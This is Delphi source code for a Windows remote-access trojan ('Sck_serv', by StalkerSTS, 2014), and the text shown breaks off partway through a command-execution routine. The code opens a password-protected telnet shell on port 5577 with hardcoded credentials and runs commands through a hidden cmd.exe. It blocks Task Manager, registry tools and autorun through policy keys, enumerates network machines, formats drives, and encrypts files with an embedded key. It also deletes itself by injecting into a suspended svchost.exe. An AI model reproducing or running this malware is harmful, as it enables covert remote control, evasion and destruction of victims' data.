Program Sck_serv;
{$I-}
// ���������� �����, ����������� �/� �������
// �������� �� ��������� login
// Created by StalkerSTS(c)2014

{ 1. ������� ��� (� �������, ���� ����� ���������, ����� �������� API �������).
      ��������, ��������, � explorer.exe.
  2. ���� �������� �������� ������� (� ��������� �����).
  3. ����� �������� �������.
}
//{$APPTYPE CONSOLE}
uses
  SysFuncs, // in '../ShareUnits/SysFuncs.pas',
  CrtSock,
  Windows,
  PsAPI,
  Classes,
  Registry,
  ShlObj,
  ComObj,
  ActiveX,
  DCPrijndael,
  DCPsha512,
  TLHelp32,
  advAPIHook;
resourcestring
      // ������ - ���������� ���������� ASCII ���� ��������, �������� � ����
      // ����, ��� ����� ��������� SHA-384, ������������� SSH � �.�.
      // �� ��� ����� ������� ������ ������?
      // � �� strings ������� ���������� "����������" � ������.
      //�����
      TrojLogin = 'stalker';
      TrojPasw  = 'OBnlegca'; //rijndael
      // ����
      l_port    = '5577';
      Comspec   = 'c:\windows\system32\cmd.exe /c';
const LN_FEED = #13#10;          // ������� ������
      CR = #13;                  // Enter ��� <CR>
      RestartTimeWait = 3000;    // ����� ����� ������� �� ��������
      Bs = 512;                  // ������ ����� ��� �����������
      //------------------------------------------------------------
      Ver = 'ESS (Telnet Socket Server) v.0.1 by StalkerSTS.(�)2014';
      Str_Hello = 'HELLO from ' + Ver + #13#10; // ������ �����������
      Str_Psw = 'Enter the password: ';         // ����������� � ����� ������
      Str_Login = 'Enter login: ';              // ����������� � ����� ������
      Disc_String = 'Disconnecting...';
      PS1 = '>';  // ������� �����������
      PS2 = ':';  // ����������� � ������� �� ������� � �.�.
      MaxLn = 50; // ��������� ����� (���-�� ��� ������ �� ����� � ������ �������
      MaxCmdLen = 255;     // ����. �����, ����������� ������
      EchoStyle = false;   // false - ��� ���������
      // ��� ��������� ��� ������� DeleteSelf
      InjectionForDelete = 'svchost.exe';

type
  PNetResourceArray = ^TNetResourceArray;
  TNetResourceArray = array[0..MaxInt div SizeOf(TNetResource) - 1] of TNetResource;
  PathBuf    = array [0..MAX_PATH] of char;//����� ���� � �����

{$IFDEF CONDITIONALEXPRESSIONS}
  {$IF Defined(TOSVersionInfoEx)}
    {$DEFINE TOSVERSIONINFOEX_DEFINED}
  {$IFEND}
{$ENDIF}
{$IFNDEF TOSVERSIONINFOEX_DEFINED}

type
  POSVersionInfoEx = ^TOSVersionInfoEx;
  TOSVersionInfoEx = packed record
    dwOSVersionInfoSize: DWORD;
    dwMajorVersion     : DWORD;
    dwMinorVersion     : DWORD;
    dwBuildNumber      : DWORD;
    dwPlatformId       : DWORD;
    szCSDVersion       : array [0..127] of AnsiChar;
    wServicePackMajor  : Word;
    wServicePackMinor  : Word;
    wSuiteMask         : Word;
    wProductType       : Byte;
    wReserved          : Byte;
  end;

const
  VER_SERVER_NT                       = $80000000;
  {$EXTERNALSYM VER_SERVER_NT}
  VER_WORKSTATION_NT                  = $40000000;
  {$EXTERNALSYM VER_WORKSTATION_NT}
  VER_SUITE_SMALLBUSINESS             = $00000001;
  {$EXTERNALSYM VER_SUITE_SMALLBUSINESS}
  VER_SUITE_ENTERPRISE                = $00000002;
  {$EXTERNALSYM VER_SUITE_ENTERPRISE}
  VER_SUITE_BACKOFFICE                = $00000004;
  {$EXTERNALSYM VER_SUITE_BACKOFFICE}
  VER_SUITE_COMMUNICATIONS            = $00000008;
  {$EXTERNALSYM VER_SUITE_COMMUNICATIONS}
  VER_SUITE_TERMINAL                  = $00000010;
  {$EXTERNALSYM VER_SUITE_TERMINAL}
  VER_SUITE_SMALLBUSINESS_RESTRICTED  = $00000020;
  {$EXTERNALSYM VER_SUITE_SMALLBUSINESS_RESTRICTED}
  VER_SUITE_EMBEDDEDNT                = $00000040;
  {$EXTERNALSYM VER_SUITE_EMBEDDEDNT}
  VER_SUITE_DATACENTER                = $00000080;
  {$EXTERNALSYM VER_SUITE_DATACENTER}
  VER_SUITE_SINGLEUSERTS              = $00000100;
  {$EXTERNALSYM VER_SUITE_SINGLEUSERTS}
  VER_SUITE_PERSONAL                  = $00000200;
  {$EXTERNALSYM VER_SUITE_PERSONAL}
  VER_SUITE_BLADE                     = $00000400;
  {$EXTERNALSYM VER_SUITE_BLADE}
  VER_SUITE_EMBEDDED_RESTRICTED       = $00000800;
  {$EXTERNALSYM VER_SUITE_EMBEDDED_RESTRICTED}
  VER_SUITE_SECURITY_APPLIANCE        = $00001000;
  {$EXTERNALSYM VER_SUITE_SECURITY_APPLIANCE}

const
  VER_NT_WORKSTATION              = $0000001;
  {$EXTERNALSYM VER_NT_WORKSTATION}
  VER_NT_DOMAIN_CONTROLLER        = $0000002;
  {$EXTERNALSYM VER_NT_DOMAIN_CONTROLLER}
  VER_NT_SERVER                   = $0000003;
  {$EXTERNALSYM VER_NT_SERVER}

{$ENDIF}  // TOSVERSIONINFOEX_DEFINED

Var Srv, Cln: integer;
    Tf: Text;              // ���� �����-������, ��������������� � ����������
    ch:Char;               // ������ ����� �����
    TrmCmd: String;        // ������-�������
    // ���� ��������� ����������� ��������
    EchoOn: Boolean = EchoStyle;
    // ��������� �� �������
    ErrArray: Array[0..15] Of String =
    (
      'Operation completed successfully...',
      'Filename is empty!',
      'Directory name is empty!',
      'Parameters error!',
      'Disk letter incorrect!',
      'Login fault!',
      'Reboot error!',
      'Internal command not found!',
      'Error while killing process!',
      'Error!',
      'Error while creating directory!',
      'Error while deleting file!',
      'Error while renaming file!',
      'Copying error!','',''
    );
    CurLogin : String;
      //==========KEY==========
    KeyRelease:string = 'DJFDKSFghjyg;KH9bn6CRTXCx4hUGLB.8.nkVTJ6FJfjylk7gl7GLUHm'+
    'HG7gnkBk8jhKkKJHK87HkjkFGF6PCbV9KaK81WWYgP[CR[yjILWv2_SBE]AsLEz_8sBZ3LV5N'+
    'Go0NLL1om4 XbALjhgkk7sda823r23;d923NrUdkzPp5 DkJ2_8JvYmWFn LR3CRxyfswsto'+
    'cvnkscv78h2lk8HHKhlkjdfvsd;vlkvsd0vvds;ldvhyB[NXzl5y5Z';

    function SHFormatDrive( hWnd: HWND; Drive: Word; fmtID: Word;
                        Options: Word ): Longint; stdcall;
    external 'Shell32.dll' name 'SHFormatDrive';


Procedure ClnStop(SrvSck, ClnSck: Integer);
Begin
   AssignCrtSock(Srv, Input, Output);
   Disconnect(Cln);
End;

Function Check_Avail: Boolean;
 {Var
  SockSet:Packed Record
  count:integer;
  Socks: integer;
  End;}
  //Timeval:TTimeOut;
Begin
  Result:=True;
  if (SockAvail(Cln) < 0) Then
     Begin
        // ��� ������ ��������
        ClnStop(Srv, Cln);
        Result:=False;
     End;
End;

Function RecodeToOEM(const S: String): String;
Var NewS: String;
Begin
   if (Length(S) = 0) Then exit;
   SetLength(NewS, Length(S));
   AnsiToOEM(PChar(S), PChar(NewS));
   Result := NewS;
End;

Function RecodeToANSI(const S: String): String;
Var NewS: String;
Begin
   if (Length(S) = 0) Then exit;
   SetLength(NewS, Length(S));
   OEMToAnsi(PChar(S), PChar(NewS));
   Result := NewS;
End;

Procedure WriteLf(S: String; Recode: Boolean = true); overload;
Begin
   if (Recode) Then S := RecodeToOEM(S);
   Write(S + LN_FEED);
End;

Procedure WriteLf(const S: Int64); overload;
Begin
   Write(S, LN_FEED);
End;

Function ShErr: Boolean;
// ����� ������ ������������ �������
Var Err: Integer;
Begin
   Err:=IOResult;
   Result:=False;
   If Err <> 0 Then
      Begin
         Result:=True;
         WriteLf(SysErrorMessage(Err));
      End else WriteLf('> ... OK');
End;

//�������� ���� �� ������  ShowMessage( GetFileNameFromLink( 'C:\NOTEPAD.lnk' ) );
function GetFileNamefromLink(LinkFileName: string): string;
var
  MyObject: IUnknown;
  MySLink: IShellLink;
  MyPFile: IPersistFile;
  FileInfo: TWin32FINDDATA;
  WidePath: array[0..MAX_PATH] of WideChar;
  Buff: array[0..MAX_PATH] of Char;
begin
  Result := '';
  CoInitialize(nil);
  if (fileexists(Linkfilename) = false) then exit;
  MyObject := CreateComObject(CLSID_ShellLink);
  MyPFile := MyObject as IPersistFile;
  MySLink := MyObject as IShellLink;
  StringToWideChar(LinkFileName, WidePath, SizeOf(WidePath));
  MyPFile.Load(WidePath, STGM_READ);
  MySLink.GetPath(Buff, Max_PATH, FileInfo, SLGP_UNCPRIORITY);
  Result := buff;
  CoUninitialize;
end;

//�������� ������� ���������� ����� �� ��� ������  ShowMessage( GetFileWorkingDirectoryFromLink( 'C:\NOTEPAD.lnk' ) );
function GetFileWorkingDirectoryFromLink( LinkFileName: string ): string;
var
 MyObject: IUnknown;
 MySLink: IShellLink;
 MyPFile: IPersistFile;
 WidePath: array[0..MAX_PATH] of WideChar;
 Buff: array[0..MAX_PATH] of Char;
begin
 Result := '';
 CoInitialize(nil);
if ( FileExists( LinkFileName ) = false ) then Exit;
 MyObject := CreateComObject( CLSID_ShellLink );
 MyPFile := MyObject as IPersistFile;
 MySLink := MyObject as IShellLink;
 StringToWideChar( LinkFileName, WidePath, SizeOf( WidePath ) );
 MyPFile.Load( WidePath, STGM_READ );
 MySLink.GetWorkingDirectory( Buff, MAX_PATH );
 Result := buff;
 CoUninitialize; 
end;

function GetOSVersionInfo(var Info: TOSVersionInfoEx): Boolean;
begin
  FillChar(Info, SizeOf(TOSVersionInfoEx), 0);
  Info.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
  Result := GetVersionEx(TOSVersionInfo(Addr(Info)^));
  if (not Result) then
  begin
    FillChar(Info, SizeOf(TOSVersionInfoEx), 0);
    Info.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
    Result := GetVersionEx(TOSVersionInfo(Addr(Info)^));
    if (not Result) then
      Info.dwOSVersionInfoSize := 0;
  end;
end;

function GetOSVersionText: string;
var
  Info: TOSVersionInfoEx;
  Key: HKEY;
begin
  Result := '';
  if (not GetOSVersionInfo(Info)) then
    Exit;
  case Info.dwPlatformId of
    { Win32s }
    VER_PLATFORM_WIN32s:
      Result := 'Microsoft Win32s';
    { Windows 9x }
    VER_PLATFORM_WIN32_WINDOWS:
      if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 0) then
      begin
        Result := 'Microsoft Windows 95';
        if (Info.szCSDVersion[1] in ['B', 'C']) then
          Result := Result +' OSR2';
      end
      else if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 10) then
      begin
        Result := 'Microsoft Windows 98';
        if (Info.szCSDVersion[1] = 'A') then
          Result := Result + ' SE';
      end
      else if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 90) then
        Result := 'Microsoft Windows Millennium Edition';
    { Windows NT }
    VER_PLATFORM_WIN32_NT:
      begin
        { Version }
        if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 2) then
          Result := 'Microsoft Windows Server 2003'
        else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 1) then
          Result := 'Microsoft Windows XP'
        else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 0) then
          Result := 'Microsoft Windows 2000'
        else
          Result := 'Microsoft Windows NT';
        { Extended }
        if (Info.dwOSVersionInfoSize >= SizeOf(TOSVersionInfoEx)) then
        begin
          { ProductType }
          if (Info.wProductType = VER_NT_WORKSTATION) then
          begin
            if (Info.dwMajorVersion = 4) then
              Result := Result + #10'Workstation 4.0'
            else if(Info.wSuiteMask and VER_SUITE_PERSONAL <> 0) then
              Result := Result + #10'Home Edition'
            else
              Result := Result + #10'Professional';
          end
          else if (Info.wProductType = VER_NT_SERVER) then
          begin
             if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 2) then
             begin
               if (Info.wSuiteMask and VER_SUITE_DATACENTER <> 0) then
                 Result := Result + #10'Datacenter Edition'
               else if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                 Result := Result + #10'Enterprise Edition'
               else if (Info.wSuiteMask = VER_SUITE_BLADE) then
                 Result := Result + #10'Web Edition'
               else
                 Result := Result + #10'Standard Edition';
             end
             else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 0) then
             begin
               if (Info.wSuiteMask and VER_SUITE_DATACENTER <> 0) then
                  Result := Result + #10'Datacenter Server'
               else if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                  Result := Result + #10'Advanced Server'
               else
                  Result := Result + #10'Server';
             end
             else
             begin
               Result := Result + #10'Server ' +
                 IntToStr(Info.dwMajorVersion) + '.' +
                 IntToStr(Info.dwMinorVersion);
               if (Info.wSuiteMask and VER_SUITE_ENTERPRISE <> 0) then
                 Result := Result + ', Enterprise Edition';
             end;
          end;
        end;
        { CSDVersion }
        if (Info.dwMajorVersion = 4) and
          (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
            'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Hotfix\Q246009', 0,
            KEY_QUERY_VALUE, Key) = ERROR_SUCCESS) then
        begin
          Result := Result + #10'Service Pack 6a';
          RegCloseKey(Key);
        end
        else
          Result := Result + #10 + (Info.szCSDVersion);
          Result := Result + #10'(Build ' +
          IntToStr(Info.dwBuildNumber and $FFFF) + ')';
      end;
  end;
end;

// ������ �� �������
function RegQueryStr(RootKey: HKEY; Key, Name: string;
  Success: PBoolean = nil): string;
var
  Handle: HKEY;
  Res: LongInt;
  DataType, DataSize: DWORD;
begin
  if Assigned(Success) then
    Success^ := False;
  Res := RegOpenKeyEx(RootKey, PChar(Key), 0, KEY_QUERY_VALUE, Handle);
  if Res <> ERROR_SUCCESS then
    Exit;
  Res := RegQueryValueEx(Handle, PChar(Name), nil, @DataType, nil, @DataSize);
  if (Res <> ERROR_SUCCESS) or (DataType <> REG_SZ) then
  begin
    RegCloseKey(Handle);
    Exit;
  end;
  SetString(Result, nil, DataSize - 1);
  Res := RegQueryValueEx(Handle, PChar(Name), nil, @DataType, @Result[1], @DataSize);
  if Assigned(Success) then
    Success^ := Res = ERROR_SUCCESS;
  RegCloseKey(Handle);
end;

// ������ � �������
function RegWriteStr(RootKey: HKEY; Key, Name, Value: string): Boolean;
var
  Handle: HKEY;
  Res: LongInt;
begin
  Result := False;
  Res := RegCreateKeyEx(RootKey, PChar(Key), 0, nil, REG_OPTION_NON_VOLATILE,
    KEY_ALL_ACCESS, nil, Handle, nil);
  if Res <> ERROR_SUCCESS then
    Exit;
  Res := RegSetValueEx(Handle, PChar(Name), 0, REG_SZ, PChar(Value),
    Length(Value) + 1);
  Result := Res = ERROR_SUCCESS;
  RegCloseKey(Handle);
end;

//����� ������ �� �����
procedure FindFilesByMask(List :tStrings; var DirCount :Integer; const DirName, Mask :String; SubDir: Boolean = True);
// ����� ������ �� ����� � �������� ����� � ��������
  // ��� ������ ���������� � ��������� ���������� � ����������� ���������,
  // ��� ������ ��� ������� ������ ��� ����. ������� ��������� ���������
  // ���������
  procedure ScanDirs(const DirName :String);
  var
    h   :tHandle;
    wfd :tWin32FindData;
  begin
    Inc(DirCount); // ������ ��� ����������
    // ������� ���������� ������� ������� �� �������� �����
    h := Windows.FindFirstFile(PChar(DirName+Mask), wfd);
    try
      if  h <> INVALID_HANDLE_VALUE  then begin
        repeat
          if  (wfd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) = 0  then
            List.Add(DirName+wfd.cFileName);
        until  not Windows.FindNextFile(h,wfd);
      end;
      // �������� ���� ������ � FindFirstFile � FindNextFile
      case  GetLastError  of
        ERROR_NO_MORE_FILES,    // ������ ��� ������ � ��������� ��������������� ����� (�� ����)
        ERROR_FILE_NOT_FOUND,   // ������ ��� ������ � ��������� ��������������� �����
        ERROR_SHARING_VIOLATION // ��������� �� ����� �������� �������� (��� ������ �� ��� ����������)
                              : ; // ������ �� ������, ��� Ok
        else // ��� ��������� ������
          WriteLf('Error view catalog: "%s": %s '+DirName);
      end;
    finally
      if  h <> INVALID_HANDLE_VALUE  then Windows.FindClose(h);
    end;
    // ������ ��������� ���������� �����������
    if not SubDir then exit; // 13.06.03
    h := Windows.FindFirstFile(PChar(DirName+'*.*'), wfd);
    try
      if  h <> INVALID_HANDLE_VALUE  then begin
        repeat
          if   ((wfd.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY) <> 0)
           and (wfd.cFileName <> String('.'))
           and (wfd.cFileName <> '..')           then
            ScanDirs(IncludeTrailingPathDelimiter(DirName+wfd.cFileName));
        until  not Windows.FindNextFile(h,wfd);
      end;
      // �������� ���� ������ � FindFirstFile � FindNextFile
      case  GetLastError  of
        ERROR_NO_MORE_FILES,    // ������ ��� ������ � ��������� ��������������� ����� (�� ����)
        ERROR_FILE_NOT_FOUND,   // ������ ��� ������ � ��������� ��������������� �����
        ERROR_SHARING_VIOLATION // ��������� �� ����� �������� �������� (��� ������ �� ��� ����������)
                              : ; // ������ �� ������, ��� Ok
        else // ��� ��������� ������
           WriteLf('Error view catalog: "%s": %s '+DirName);
      end;
    finally
      if  h <> INVALID_HANDLE_VALUE  then Windows.FindClose(h);
    end;
  end;
begin // FindFilesByMask
  ScanDirs(IncludeTrailingPathDelimiter(DirName));
end;

procedure AutoReg;
var
  i,y: Integer;
  reg: TRegistry;
  ts: TStringList;
   s: string;
begin
  //������� ������� � ������
  Reg := TRegistry.Create;
  ts := TStringList.Create;
  //����� ������� �������
  reg.RootKey := HKEY_LOCAL_MACHINE;
  try
    //������ ����
    if Reg.OpenKeyReadOnly('Software\Microsoft\Windows\CurrentVersion\Run\') then
    begin
      //�������� ������ ���������� ����������� � �����
      reg.GetValueNames(ts);
      for i := 0 to ts.Count - 1 do
      begin
        //���� ���������� ����������
        if Reg.ValueExists(ts.Strings[i]) then
        begin
          //������ � ��������
          WriteLf(reg.ReadString(ts.Strings[i]));
        end;
      end;
    end;
  finally
    //����������
    reg.Free;
    ts.Free;
  end;
  //������� ������� � ������
  Reg := TRegistry.Create;
  ts := TStringList.Create;
  //����� ������� �������
  reg.RootKey := HKEY_CURRENT_USER;
  try
    //������ ����
    if Reg.OpenKeyReadOnly('Software\Microsoft\Windows\CurrentVersion\Run\') then
    begin
      //�������� ������ ���������� ����������� � �����
      reg.GetValueNames(ts);
      for i := 0 to ts.Count - 1 do
      begin
        //���� ���������� ����������
        if Reg.ValueExists(ts.Strings[i]) then
        begin
          //������ � ��������
          WriteLf(reg.ReadString(ts.Strings[i]));
        end;
      end;
    end;
  finally
    //����������
    reg.Free;
    ts.Free;
  end;
  s:=RegQueryStr(HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders','Startup');
  ts:=TStringList.Create;
  FindFilesByMask(ts, i, s, '*.lnk');
  for y:=0 to ts.Count-1 do begin
      s:=ts.Strings[y];
      WriteLf(GetFileNameFromLink(s));
  end;
  ts.Free;
end;

function DriveExists(Drive: Byte): boolean;
begin
  Result := Boolean(GetLogicalDrives and (1 shl Drive));
end;

procedure FindAllComputers(Workgroup: String);
var
EnumHandle: THandle;
 WorkgroupRS : TNetResource;
  Computer: Array[1..100] of String[25];
   Buf: Array[1..500] of TNetResource;
     BufSize:cardinal;   Entries:cardinal;
       Result      : Integer;
       ComputerCount : Integer;
begin
 ComputerCount := 0;
 Workgroup := Workgroup + #0;
 FillChar(WorkgroupRS, SizeOf(WorkgroupRS) , 0);
 With WorkgroupRS do begin
 dwScope := 2;
 dwType := 3;
 dwDisplayType := 1;
 dwUsage := 2;
 lpRemoteName := @Workgroup[1];
   end;
 WNetOpenEnum( RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,@WorkgroupRS,EnumHandle );
 Repeat
 Entries := 1;
 BufSize := SizeOf(Buf);
 Result :=WNetEnumResource( EnumHandle,Entries,@Buf,BufSize);
 If (Result = NO_ERROR) and (Entries = 1) then
  begin
  Inc( ComputerCount );
  Computer[ ComputerCount ] := Buf[1].lpRemoteName;
  WriteLf(Buf[1].lpRemoteName);
  end;
  Until (Entries <> 1) or (Result <> NO_ERROR);
  WNetCloseEnum( EnumHandle );
end;  { Find All Computers }

function GetCurrentUserName: string;
const
   cnMaxUserNameLen = 254;
var
   sUserName: string;
   dwUserNameLen: DWORD;
begin
   dwUserNameLen := cnMaxUserNameLen - 1;
   SetLength(sUserName, cnMaxUserNameLen);
   GetUserName(PChar(sUserName), dwUserNameLen);
   SetLength(sUserName, dwUserNameLen);
   Result := sUserName;
end;

function GetComputerNetName: string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := buffer
  else
    Result := ''
end;

procedure GetCompUser;
var
  c,u: string;
begin
 c:=GetComputerNetName;
 u:=GetCurrentUserName;
 WriteLf('> ... ComputerNetName: '+c);
 WriteLf('> ... CurrentUserName: '+u);
end;

//������ IP
procedure GetLocalIP;
var
  s: string;
  i:integer;
begin
   i:=HostToLong(GetComputerNetName);
   s:=LongToIp(i);
   WriteLf('LocalIP: '+s);
end;

function GetWindowsPath:string;
begin
 SetLength(Result,MAX_PATH);
 SetLength(Result,GetWindowsDirectory(@Result[1],MAX_PATH));
 WriteLf('> ... Windows: '+Result);
end;

procedure BlockReg(a:integer);
var
  H: TRegistry;
begin
  H := TRegistry.Create;
  with H do
  begin
    RootKey := HKEY_CURRENT_USER;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\System', true);
    WriteInteger('DisableRegistryTools', a);
  if a = 1 then
    WriteLf('> ... Registry: BLOCK')
  else WriteLf('> ... Registry: UNBLOCK');
  end;
  H.CloseKey;
  H.Free;
end;

procedure BlockAutoRun(a:integer);
var
  H: TRegistry;
begin
  H := TRegistry.Create;
  with H do
  begin
    RootKey := HKEY_LOCAL_MACHINE;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
    WriteInteger('DisableLocalMachineRun', a);
    H.CloseKey;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
    WriteInteger('DisableLocalMachineRunOnce', a);
    H.CloseKey;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
    WriteInteger('DisableCurrentUserRun', a);
    H.CloseKey;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', true);
    WriteInteger('DisableCurrentUserRun�nce', a);
  if a = 1 then
    WriteLf('> ... Run: BLOCK')
  else WriteLf('> ... Run: UNBLOCK');
  end;
  H.CloseKey;
  H.Free;
end;

procedure BlockTaskMgr(a:integer);
var
  H: TRegistry;
begin
  H := TRegistry.Create;
  with H do
  begin
    RootKey := HKEY_CURRENT_USER;
    OpenKey('\Software\Microsoft\Windows\CurrentVersion\Policies\System', true);
    WriteInteger('DisableTaskMgr', a);
  if a = 1 then
    WriteLf('> ... TaskMgr: BLOCK')
  else WriteLf('> ... TaskMgr: UNBLOCK');
  end;
  H.CloseKey;
  H.Free;
end;

procedure DriveEx;
var
  i: integer;
  C: String;
  DType: Integer;
  DriveString: String;
  SerialNum : dword;
  a, b : dword;
  Buffer : array [0..255] of char;
  LogDrives: set of 0..25;
begin
  integer(LogDrives) := GetLogicalDrives;
  for i := 0 to 25 do
    if (i in LogDrives) then begin
    if GetVolumeInformation(PChar(chr(i + 65)+':\'), Buffer, SizeOf(Buffer), @SerialNum, a, b, nil, 0) then
       WriteLf('> ... '+chr(i + 65)+' - SN: - '+IntToStr(SerialNum));
    end;
 for i:=65 to 90 do
  begin
   C:=chr(i)+':\';
   DType:=GetDriveType(PChar(C));
   case DType of
     0: DriveString:=C+' Tip nakopitelya ne mojshet bit opredelen.';
     1: DriveString:=C+' Kornevaya directorya ne syshestvuet.';
     DRIVE_REMOVABLE: DriveString:=
        C+' Disk mojshet bit ydalen iz nakopitelya.';
     DRIVE_FIXED: DriveString:=
        C+' Disk ne mojshet bit ydalen iz nakopitelya.';
     DRIVE_REMOTE: DriveString:=
        C+' Udalenya (setevoy) disk.';
     DRIVE_CDROM: DriveString:=C+' Ustroystva - CD-ROM.';
     DRIVE_RAMDISK: DriveString:=C+' Ustroystva - RAM disk.';
    end;
   if not ((DType = 0) or (DType = 1))
   then WriteLf(DriveString);
  end;
end;

procedure FormatDrive(Drive: char);
const
  SHFMT_ID_DEFAULT = $FFFF;
  // ������� (������� ���������� �����)
  SHFMT_OPT_QUICKFORMAT = 0;
  // ������
  SHFMT_OPT_FULLFORMAT = 1;
  // ������ ����������� ��������� ������
  SHFMT_OPT_SYSONLY = 2;
  SHFMT_ERROR = -1;
  SHFMT_CANCEL = -2;
  SHFMT_NOFORMAT = -3;
var
  FmtRes: longint;
  FmtDrive: word;
  aSh: THandle;
begin
   FmtDrive := Ord( UpCase( Drive ) ) - 65;
   try
      FmtRes:= ShFormatDrive(aSh,
                              FmtDrive,
                              SHFMT_ID_DEFAULT,
                              SHFMT_OPT_QUICKFORMAT );
      case FmtRes of
         SHFMT_ERROR: WriteLf( 'Error formatting the drive' );
         SHFMT_CANCEL: WriteLf( 'User canceled formatting the drive' );
         SHFMT_NOFORMAT: WriteLf( 'No Format' )
         else WriteLf('Disk has been formatted');
      end;
   except
   end;
end;

function EncS(Source, Password: string): string;
var
  DCP_rijndael1: TDCP_rijndael;
begin
  DCP_rijndael1 := TDCP_rijndael.Create(nil);   // ������ ������
  DCP_rijndael1.InitStr(Password, TDCP_sha512);    // ��������������
  Result := DCP_rijndael1.EncryptString(Source); // �������
  DCP_rijndael1.Burn;                            // ������� ���� � �����
  DCP_rijndael1.Free;                            // ���������� ������
end;

function DecS(Source, Password: string): string;
var
  DCP_rijndael1: TDCP_rijndael;
begin
  DCP_rijndael1 := TDCP_rijndael.Create(nil);   // ������ ������
  DCP_rijndael1.InitStr(Password, TDCP_sha512);    // ��������������
  Result := DCP_rijndael1.DecryptString(Source); // ���������
  DCP_rijndael1.Burn;                            // ������� ���� � �����
  DCP_rijndael1.Free;                            // ���������� ������
end;

//������������ �����:
function EncF(Source, Dest: string): Boolean;
var
  DCP_rijndael1: TDCP_rijndael;
  Password: string;
  SourceStream, DestStream: TFileStream;
begin
  Result := True;
  try
    Password:=KeyRelease;
    FileMode:=0;
    SourceStream := TFileStream.Create(Source, FileMode);
    DestStream := TFileStream.Create(Dest, fmCreate);
    DCP_rijndael1 := TDCP_rijndael.Create(nil);
    DCP_rijndael1.InitStr(Password, TDCP_sha512);
    DCP_rijndael1.EncryptStream(SourceStream, DestStream, SourceStream.Size);
    DCP_rijndael1.Burn;
    DCP_rijndael1.Free;
    DestStream.Free;
    SourceStream.Free;
  except
    Result := False;
  end;
end;

//������������� �����:
function DecF(Source, Dest: string): Boolean;
var
  DCP_rijndael1: TDCP_rijndael;
  Password: string;
  SourceStream, DestStream: TFileStream;
begin
  Result := True;
  try
    Password:=KeyRelease;
    FileMode:=0;
    SourceStream := TFileStream.Create(Source, FileMode);
    DestStream := TFileStream.Create(Dest, fmCreate);
    DCP_rijndael1 := TDCP_rijndael.Create(nil);
    DCP_rijndael1.InitStr(Password, TDCP_sha512);
    DCP_rijndael1.DecryptStream(SourceStream, DestStream, SourceStream.Size);
    DCP_rijndael1.Burn;
    DCP_rijndael1.Free;
    DestStream.Free;
    SourceStream.Free;
  except
    Result := False;
  end;
end;

Function GetRealPasw(const Psw: String): String;
// ��������� ������ 
Var LPos, Pl: Integer;
Begin
   Result:='';
   Pl:=Length(Psw);
   LPos:=1;
   While (LPos < Pl)
      Do
         Begin
            Result:=Psw;    //+ Chr(StrToIntDef(Copy(Psw, LPos, 3), 0))
            LPos:=LPos + 3;
         End;
End;

Var FileName: array[0..255] of char;
Procedure FileDelete;
Begin
   DeleteFile(FileName);
   ExitProcess(0);
End;

procedure DeleteSelf;
// ������������
var
 St: TStartupInfo;
 Pr: TProcessInformation;
Begin
   GetModuleFileName(GetModuleHandle(nil), FileName, 255);
   if (not CreateProcess(nil, InjectionForDelete, nil, nil, false,
       CREATE_SUSPENDED, nil, nil, St, Pr)) Then Halt(1);

   InjectThisExe(Pr.hProcess, @FileDelete);
   ExitThread(0);
end;

procedure ExecConsoleApp(const CommandLine: AnsiString);
// ������ ���������� ��������� � ���������������� ������ � ����
Var
  sa: TSECURITYATTRIBUTES;
  si: TSTARTUPINFO;
  pi: TPROCESSINFORMATION;
  hPipeOutputRead: THANDLE;
  hPipeOutputWrite: THANDLE;
  hPipeErrorsRead: THANDLE;
  hPipeErrorsWrite: THANDLE;
  Res, bTest: Boolean;
  env: Array[0..100] of Char;
  szBuffer: Array[0..256] of Char;
  dwNumberOfBytesRead: DWORD;

Begin
  sa.nLength := sizeof(sa);
  sa.bInheritHandle := true;
  sa.lpSecurityDescriptor := nil;
  CreatePipe(hPipeOutputRead, hPipeOutputWrite, @sa, 0);
  CreatePipe(hPipeErrorsRead, hPipeErrorsWrite, @sa, 0);
  ZeroMemory(@env, SizeOf(env));
  ZeroMemory(@si, SizeOf(si));
  ZeroMemory(@pi, SizeOf(pi));
  si.cb := SizeOf(si);
  si.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
  si.wShowWindow := SW_HIDE;
  si.hStdInput:=0;
  si.hStdOutput:=hPipeOutputWrite;
  si.hStdError:=hPipeErrorsWrite;

  Res:=CreateProcess(nil, pchar(CommandLine), nil, nil, true,
    CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, @env, nil, si, pi);

  // Procedure will exit if CreateProcess fail
  If Not Res Then
  Begin
    CloseHandle(hPipeOutputRead);
    CloseHandle(hPipeOutputWrite);
    CloseHandle(hPipeErrorsRead);
    CloseHandle(hPipeErrorsWrite);
    Exit;
  End;
  CloseHandle(hPipeOutputWrite);
  CloseHandle(hPipeErrorsWrite);

  // Read output pipe
   While true Do
      Begin
         FillChar(szBuffer, SizeOf(szBuffer), 0);
         bTest:=ReadFile(hPipeOutputRead, szBuffer, 256, dwNumberOfBytesRead,
                  nil);
         If Not bTest Then break;
         // ������� M$ ���� � OEM ���������� ������
